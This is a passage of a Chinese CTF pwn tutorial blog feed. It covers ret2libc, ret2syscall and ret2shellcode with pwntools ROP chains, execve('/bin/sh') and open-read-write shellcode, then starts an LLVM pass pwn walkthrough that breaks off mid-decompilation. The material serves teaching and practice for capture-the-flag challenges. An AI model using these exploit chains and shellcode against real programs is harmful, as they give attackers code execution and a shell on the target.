<span class="token string">b'a'</span> <span class="token operator">*</span> ? <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc文件路径'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basebin_sh <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> libc_basep <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> ? <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="堆栈平衡"><a href="#堆栈平衡" class="headerlink" title="堆栈平衡"></a>堆栈平衡</h4><p>某些指令，如<code>movaps</code>（用于操作<code>XMM</code>寄存器），要求栈指针<code>RSP</code>必须是<code>16</code>字节对齐的，直接从返回地址开始写<code>rop</code>链可能会造成堆栈不平衡，需要在<code>rop</code>链前加上汇编指令<code>ret</code>平衡堆栈</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$ROPgadget</span> <span class="token parameter variable">--binary</span> ./pwn <span class="token parameter variable">--only</span> <span class="token string">'ret'</span><span class="token comment">#查找ret指令的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="32位程序"><a href="#32位程序" class="headerlink" title="32位程序"></a>32位程序</h4><p>32位和64位的区别就是32位通过栈传参而不通过寄存器传参，所以不像64位需要找<code>pop rdi</code>的值，32位构造<code>rop</code>链的方式是函数+返回地址+参数列表，例如</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> ?p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gets<span class="token punctuation">)</span><span class="token comment">#gets(buf)</span>p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token comment">#system(buf)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>对应32位的程序</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x64</span> <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gets_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p><a href="https://starrysky1004.github.io/ret2libc.zip">https://starrysky1004.github.io/ret2libc.zip</a></p><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>在题目没有给<code>libc</code>的情况下可以通过泄露多个已知函数名的地址，在<a href="https://libc.rip/%E4%B8%AD%E6%9F%A5%E8%AF%A2">https://libc.rip/中查询</a></p><h2 id="4-ret2syscall-amp-ret2shellcode-amp-零碎知识点"><a href="#4-ret2syscall-amp-ret2shellcode-amp-零碎知识点" class="headerlink" title="4.ret2syscall&amp;ret2shellcode&amp;零碎知识点"></a>4.ret2syscall&amp;ret2shellcode&amp;零碎知识点</h2><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><h4 id="前置基础-2"><a href="#前置基础-2" class="headerlink" title="前置基础"></a>前置基础</h4><p>操作系统的进程空间分为用户空间和内核空间，内核空间需要更高的权限，系统调用就是运行在用户空间的程序向操作系统内核请求需要更高权限运行的<strong>内核函数</strong></p><p>当用户态进程发起一个系统调用，<code>CPU</code>切换到内核态并开始执行一个内核函数。由于系统调用处理函数只有一个，所以需要通过<code>rax</code>传递系统调用号确定调用的函数</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>应用程序在用户态准备好调用参数（包括系统调用号和函数参数），在<code>64</code>位程序中执行<code>syscall</code>或在<code>32</code>位程序中执行<code>int 80</code>触发软中断，<code>CPU</code>被软中断打断后执行对应中断处理函数，最后执行<code>ret</code>指令切换回用户态</p><p>常用系统调用号：</p><p><code>32</code>位  <code>read 3  open 5write 4  sigreturn 77/0x4Dexecve 11/0xb</code></p><p><code>64</code>位  <code>read 0      open 2write 1  sigreturn 15/0xF   execve 59/0x3b</code></p><p><code>execve</code>用法：<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对比<code>ret2libc</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>xxx_plt<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>全部系统调用号参考：<a href="https://syscalls.mebeim.net/?table=x86/64/x64/latest">https://syscalls.mebeim.net/?table=x86/64/x64/latest</a></p><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><h4 id="前置基础-3"><a href="#前置基础-3" class="headerlink" title="前置基础"></a>前置基础</h4><p>控制程序执行<code>shellcode</code>代码，<code>shellcode</code>指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的<code>shell</code>，或者<code>open read write</code>获取并输出<code>flag</code>，通常情况下<code>shellcode</code>需要我们自行编写，即向内存中填充一些可执行的代码</p><p>前提条件：<code>shellcode</code>所在的区域具有可执行权限</p><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>查看禁用的函数<code>seccomp-tools dump ./pwn</code></p><p><code>exp</code>中<code>pwntools</code>使用：</p><ul><li><p>使用<code>asm()</code>将汇编代码转换为对应的机器码</p></li><li><p>生成<code>shell</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>生成<code>orw</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x123000</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token comment">#'rsp'</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x123000</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>自己写<code>shellcode</code></p><ul><li><p>执行<code>execve(&#39;/bin/sh&#39;, 0, 0)</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">shellcode &#x3D; &#39;&#39;&#39;xor rdx,rdxpush rdxmov rsi,rspmov rax,0x68732f2f6e69622fpush raxmov rdi,rspmov rax,59syscall&#39;&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>执行<code>open read write</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">shellcode &#x3D; &quot;&quot;&quot;push 0x67616c66mov rdi,rspxor esi,esipush 2pop raxsyscallmov rdi,raxmov rsi,rspmov edx,0x100xor eax,eaxsyscallmov edi,1mov rsi,rsppush 1pop raxsyscall&quot;&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><p>在线汇编和反汇编：<a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/">http://shell-storm.org/online/Online-Assembler-and-Disassembler/</a></p><h4 id="常见情况"><a href="#常见情况" class="headerlink" title="常见情况"></a>常见情况</h4><ul><li>没有开启<code>NX</code>保护，可以泄露栈地址向栈中写入<code>shellcode</code>再将返回地址改到该地址</li><li>程序使用<code>mprotect</code>函数给某一段可读可写可执行权限，并且让用户向这一段的变量中输入，再直接将输入的变量作为函数调用</li></ul><h3 id="零碎知识点"><a href="#零碎知识点" class="headerlink" title="零碎知识点"></a>零碎知识点</h3><p>整数溢出：变量定义为整型但输入后<code>(unsigned int)</code>强制转化为无符号整型，输入<code>-1</code>则变成正无穷</p><p>字符溢出：<code>char</code>类型范围是<code>-128~+127</code>，因此输入超过<code>128</code>会变成负数</p><p>数组越界：<code>index</code>可控的时候越界写到其他变量</p><p><code>str</code>类函数：例如<code>strcpy</code>、<code>strcat</code>、<code>strcmp</code>、<code>strlen</code>等函数会被<code>\x00</code>截断</p><p><code>scanf</code>：输入<code>+</code>或<code>-</code>不会有实际输入</p><p>随机数绕过：利用<code>c</code>和<code>python</code>联合编程，例如：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'./2.35/libc.so.6'</span><span class="token punctuation">)</span>seed <span class="token operator">=</span> <span class="token number">0</span>libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v6 <span class="token operator">=</span> <span class="token punctuation">(</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'input: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-pwn环境配置&quot;&gt;&lt;a href=&quot;#1-pwn环境配置&quot; class=&quot;headerlink&quot; title=&quot;1.pwn环境配置&quot;&gt;&lt;/a&gt;1.pwn环境配置&lt;/h2&gt;&lt;p&gt;视频讲解：&lt;a href=&quot;https://www.bilibili.com/vid</summary>
      
    
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="教程" scheme="https://starrysky1004.github.io/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>LLVM PASS PWN：使用c++编写exp</title>
    <link href="https://starrysky1004.github.io/2024/10/31/llvm-pass-shi-yong-c-bian-xie-exp/llvm-pass-shi-yong-c-bian-xie-exp/"/>
    <id>https://starrysky1004.github.io/2024/10/31/llvm-pass-shi-yong-c-bian-xie-exp/llvm-pass-shi-yong-c-bian-xie-exp/</id>
    <published>2024-10-31T03:27:53.000Z</published>
    <updated>2024-10-31T03:31:53.422Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近比赛中遇到一道<code>llvm pass pwn</code>，现学了一下相关知识，发现网上的讲解和例题的<code>exp</code>基本都是用的<code>c</code>语言，而比赛中的这题在题目描述中说明了用的是<code>c++</code>，虽然用<code>c</code>也可以通过修改<code>.ll</code>文件完成，但是相比之下还是觉得直接用<code>c++</code>写<code>exp</code>方便一些，主要体现在：</p><ul><li><code>c</code>语言需要导入<code>#include &lt;stdbool.h&gt;</code>头才能使用<code>bool</code>类型</li><li><code>c</code>语言没有<code>class</code>，需要先写成<code>struct</code>再修改<code>.ll</code>文件中的<code>struct</code>为<code>class</code>，且使用<code>struct</code>编写本身也比<code>class</code>麻烦</li></ul><h2 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h2><h3 id="llvm"><a href="#llvm" class="headerlink" title="llvm"></a>llvm</h3><p><code>llvm</code>的作用：<code>gcc</code>编译时前后端耦合在一起，出现新平台或编译程序都需要重新设计<code>IR</code>，而<code>llvm</code>使用统一的中间代码不需要设计新的<code>IR</code></p><p><code>llvm pass</code>：对<code>ir</code>进行分析 优化等操作的过程的模块</p><p><code>IR</code>的三种表现形式:</p><ul><li><code>.ll</code>：可读<code>IR</code>，类似汇编</li><li><code>.bc</code>：不可读二进制<code>IR</code></li><li>保存在内存中</li></ul><p><code>llvm</code>工具</p><ul><li><code>llvm-as</code>：把<code>LLVM IR</code>从人可读的文本格式汇编成成二进制格式</li><li><code>llvm-dis</code>：<code>llvm-as</code>的逆过程，即反汇编</li><li><code>opt</code>：优化<code>LLVM IR</code>，输出新的<code>LLVM IR</code></li><li><code>llc</code>：把<code>LLVM IR</code>编译成汇编码</li><li><code>lli</code>：解释执行<code>LLVM IR</code></li></ul><p>环境配置:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> clang-12 clang-8 llvm-12 llvm-8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>程序编译:</p><ul><li><p>编译为<code>.ll</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">clang-12 -emit-llvm <span class="token parameter variable">-S</span> exp.c <span class="token parameter variable">-o</span> exp.ll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>编译为<code>.bc</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">clang-12 -emit-llvm <span class="token parameter variable">-c</span> exp.c <span class="token parameter variable">-o</span> exp.bc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>程序运行:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">opt-12 <span class="token parameter variable">-load</span> ./xxx.so -标识符 ./exp.ll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中标识符与加载的动态库中注册的一个<code>pass</code>相关联，可以使用<code>-标识符</code>来启用这个<code>pass</code></p><h3 id="c-函数名修饰规则"><a href="#c-函数名修饰规则" class="headerlink" title="c++函数名修饰规则"></a>c++函数名修饰规则</h3><p>使用<code>gcc</code>或<code>clang</code>编译<code>c++</code>时会经过名称修饰的过程从而改变函数名，修饰后的名称通常包括：</p><ul><li><p><code>_Z</code>：修饰名称的开始</p></li><li><p><code>N</code>：表示这是一个函数或静态成员函数</p></li><li><p>数字：表示函数名称的长度</p></li><li><p>类名和函数名：经过编码的类名和函数名</p></li><li><p><code>E</code>：参数列表的开始</p></li><li><p>参数类型：通过不同的字母按顺序表示参数类型</p><table><thead><tr><th>字母</th><th>参数类型</th></tr></thead><tbody><tr><td>i</td><td>int</td></tr><tr><td>j</td><td>unsigned int</td></tr><tr><td>l</td><td>long</td></tr><tr><td>x</td><td>long long</td></tr><tr><td>m</td><td>unsigned long</td></tr><tr><td>c</td><td>char</td></tr><tr><td>h</td><td>unsigned char</td></tr><tr><td>b</td><td>bool</td></tr></tbody></table></li><li><p>结尾：包含额外信息如返回类型</p></li></ul><p>例如<code>_ZN4edoc4addiEhii</code>表示在<code>edoc</code>类中的函数名长度为<code>4</code>的函数<code>addi</code>，它的三个参数分别是<code>unsigned char</code>、<code>int</code>、<code>int</code>类型</p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h3><p>题目一般会给出<code>ld-linux-x86-64.so.2</code>、<code>libc.so.6</code>、<code>opt-12</code>、<code>xxx.so</code>和一个说明文档，说明文档会给出如何编译运行以及打远程，一般是将<code>.ll</code>或者<code>.bc</code>文件进行<code>base64</code>编码发送到远程，漏洞点出现在<code>xxx.so</code>，即需要逆向分析的就是这个<code>xxx.so</code>，而攻击的是<code>opt</code>程序，<code>opt</code>程序没给的话也可以用<code>/bin/opt-12</code></p><ul><li><p>在初始化函数(例如<code>_cxx_global_var_init_17</code>)中找到标识符（即<code>StringRef</code>函数的参数)</p></li><li><p>导入动态链接库<code>sudo cp xxx.so /lib</code></p></li><li><p>在<code>xxx.so</code>的<code>.data.rel.ro</code>段找到虚表，虚表的最后一项就是程序入口</p></li><li><p>进行动态调试，确定入口函数名、其他函数名、类名等</p></li><li><p>编写交互脚本</p></li><li><p>逆向分析函数，编写<code>exp</code>脚本</p></li></ul><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>使用<code>gdb opt-12</code>进行调试，并且通过<code>set args -load ./xxx.so -xxx ./exp.ll</code>导入参数，在<code>main</code>函数下断点，运行至所有<code>llvm::initialize</code>前缀的初始化函数结束，使用<code>vmmap</code>获取<code>xxx.so</code>的基址，通过<code>IDA</code>中的偏移下断点进行进一步调试（如果没有基址说明初始胡函数还没运行完</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="show-me-the-code"><a href="#show-me-the-code" class="headerlink" title="show_me_the_code"></a>show_me_the_code</h3><p>题目来源于源鲁杯<code>Round3</code>的困难题，给了<code>codeVM.so</code>、<code>ld-linux-x86-64.so.2</code>、<code>libc.so.6</code>、<code>opt-12</code>、说明文档和<code>docker</code>，给出编译指令<code>clang-12 -emit-llvm -S exp.cpp -o exp.ll</code>，上传题解的方式是将<code>exp.ll</code>进行<code>base64</code>编码并且在最后加上换行和<code>EOF</code>发送到远程，从编译指令可以看出需要用<code>c++</code>编写<code>exp</code></p><h4 id="确定标识符"><a href="#确定标识符" class="headerlink" title="确定标识符"></a>确定标识符</h4><p>直接搜索函数名<code>init</code>找到函数<code>_cxx_global_var_init_17</code>中有标识符<code>Co00o0oOd3</code>，确定了程序的运行方式是<code>./opt-12 -load ./codeVM.so -Co00o0oOd3 ./exp.ll</code>，这里需要先执行<code>sudo cp codeVM.so /lib</code>导入动态链接库</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">_cxx_global_var_init_17</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h] BYREF</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-18h]</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-10h] BYREF</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>  llvm<span class="token operator">::</span>StringRef<span class="token operator">::</span><span class="token function">StringRef</span><span class="token punctuation">(</span><span class="token punctuation">(</span>llvm<span class="token operator">::</span>StringRef <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token punctuation">,</span> <span class="token string">"Co00o0oOd3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  llvm<span class="token operator">::</span>StringRef<span class="token operator">::</span><span class="token function">StringRef</span><span class="token punctuation">(</span><span class="token punctuation">(</span>llvm<span class="token operator">::</span>StringRef <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v1<span class="token punctuation">,</span> <span class="token string">"c0oo0o0Ode Pass"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  llvm<span class="token operator">::</span>RegisterPass<span class="token operator">&lt;</span>`anonymous namespace'<span class="token operator">::</span>c0oo0o0Ode<span class="token operator">></span><span class="token operator">::</span><span class="token function">RegisterPass</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>X<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v4<span class="token punctuation">,</span> v1<span class="token punctuation">,</span> v2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__cxa_atexit</span><span class="token punctuation">(</span>llvm<span class="token operator">::</span>RegisterPass<span class="token operator">&lt;</span>`anonymous namespace'<span class="token operator">::</span>c0oo0o0Ode<span class="token operator">></span><span class="token operator">::</span><span class="token operator">~</span>RegisterPass<span class="token punctuation">,</span> <span class="token operator">&amp;</span>X<span class="token punctuation">,</span> <span class="token operator">&amp;</span>_dso_handle<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="确定程序入口函数"><a href="#确定程序入口函数" class="headerlink" title="确定程序入口函数"></a>确定程序入口函数</h4><p>在<code>.data.rel.ro</code>段找到了<code>vtable</code>，最后一项&#96;&#96;anonymous namespace’::c0oo0o0Ode::runOnFunction(llvm::Function &amp;)&#96;就是程序入口，直接点进这个函数</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.data.rel.ro:0000000000030D08                 dq offset _ZN12_GLOBAL__N_110c0oo0o0OdeD2Ev ; &#96;anonymous namespace&#39;::c0oo0o0Ode::~c0oo0o0Ode().data.rel.ro:0000000000030D10                 dq offset _ZN12_GLOBAL__N_110c0oo0o0OdeD0Ev ; &#96;anonymous namespace&#39;::c0oo0o0Ode::~c0oo0o0Ode().data.rel.ro:0000000000030D18                 dq offset _ZNK4llvm4Pass11getPassNameEv ; llvm::Pass::getPassName(void).data.rel.ro:0000000000030D20                 dq offset _ZN4llvm4Pass16doInitializationERNS_6ModuleE ; llvm::Pass::doInitialization(llvm::Module &amp;).data.rel.ro:0000000000030D28                 dq offset _ZN4llvm4Pass14doFinalizationERNS_6ModuleE ; llvm::Pass::doFinalization(llvm::Module &amp;).data.rel.ro:0000000000030D30                 dq offset _ZNK4llvm4Pass5printERNS_11raw_ostreamEPKNS_6ModuleE ; llvm::Pass::print(llvm::raw_ostream &amp;,llvm::Module const*).data.rel.ro:0000000000030D38                 dq offset _ZNK4llvm12FunctionPass17createPrinterPassERNS_11raw_ostreamERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE ; llvm::FunctionPass::createPrinterPass(llvm::raw_ostream &amp;,std::string const&amp;).data.rel.ro:0000000000030D40                 dq offset _ZN4llvm12FunctionPass17assignPassManagerERNS_7PMStackENS_15PassManagerTypeE ; llvm::FunctionPass::assignPassManager(llvm::PMStack &amp;,llvm::PassManagerType).data.rel.ro:0000000000030D48                 dq offset _ZN4llvm4Pass18preparePassManagerERNS_7PMStackE ; llvm::Pass::preparePassManager(llvm::PMStack &amp;).data.rel.ro:0000000000030D50                 dq offset _ZNK4llvm12FunctionPass27getPotentialPassManagerTypeEv ; llvm::FunctionPass::getPotentialPassManagerType(void).data.rel.ro:0000000000030D58                 dq offset _ZNK4llvm4Pass16getAnalysisUsageERNS_13AnalysisUsageE ; llvm::Pass::getAnalysisUsage(llvm::AnalysisUsage &amp;).data.rel.ro:0000000000030D60                 dq offset _ZN4llvm4Pass13releaseMemoryEv ; llvm::Pass::releaseMemory(void).data.rel.ro:0000000000030D68                 dq offset _ZN4llvm4Pass26getAdjustedAnalysisPointerEPKv ; llvm::Pass::getAdjustedAnalysisPointer(void const*).data.rel.ro:0000000000030D70                 dq offset _ZN4llvm4Pass18getAsImmutablePassEv ; llvm::Pass::getAsImmutablePass(void).data.rel.ro:0000000000030D78                 dq offset _ZN4llvm4Pass18getAsPMDataManagerEv ; llvm::Pass::getAsPMDataManager(void).data.rel.ro:0000000000030D80                 dq offset _ZNK4llvm4Pass14verifyAnalysisEv ; llvm::Pass::verifyAnalysis(void).data.rel.ro:0000000000030D88                 dq offset _ZN4llvm4Pass17dumpPassStructureEj ; llvm::Pass::dumpPassStructure(uint).data.rel.ro:0000000000030D90                 dq offset _ZN12_GLOBAL__N_110c0oo0o0Ode13runOnFunctionERN4llvm8FunctionE ; &#96;anonymous namespace&#39;::c0oo0o0Ode::runOnFunction(llvm::Function &amp;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="确定函数名和类名编写交互脚本"><a href="#确定函数名和类名编写交互脚本" class="headerlink" title="确定函数名和类名编写交互脚本"></a>确定函数名和类名编写交互脚本</h4><p>找到程序逻辑，其中<code>llvm::Value::getName</code>用于获取函数名，<code>llvm::operator==(Name, v8, v6[0], v6[1]);</code>用于比较函数名</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">__int64 __fastcall &#96;anonymous namespace&#39;::c0oo0o0Ode::runOnFunction(        _anonymous_namespace_::c0oo0o0Ode *this,        llvm::Function *a2)&#123;  __int64 v2; &#x2F;&#x2F; rdx  char v4; &#x2F;&#x2F; [rsp+Fh] [rbp-51h]  _BYTE v5[32]; &#x2F;&#x2F; [rsp+10h] [rbp-50h] BYREF  __int64 v6[2]; &#x2F;&#x2F; [rsp+30h] [rbp-30h] BYREF  __int64 Name; &#x2F;&#x2F; [rsp+40h] [rbp-20h]  __int64 v8; &#x2F;&#x2F; [rsp+48h] [rbp-18h]  llvm::Value *v9; &#x2F;&#x2F; [rsp+50h] [rbp-10h]  _anonymous_namespace_::c0oo0o0Ode *v10; &#x2F;&#x2F; [rsp+58h] [rbp-8h]  v10 &#x3D; this;  v9 &#x3D; a2;  secret::init(this);  Name &#x3D; llvm::Value::getName(a2);  v8 &#x3D; v2;  VMDatProt::getStrFromProt2(    (__int64)v5,    (__int64)&amp;&#96;anonymous namespace&#39;::vmFuncName[abi:cxx11],    (__int64)&amp;secret::vmKey[abi:cxx11]);  llvm::StringRef::StringRef(v6, v5);  v4 &#x3D; 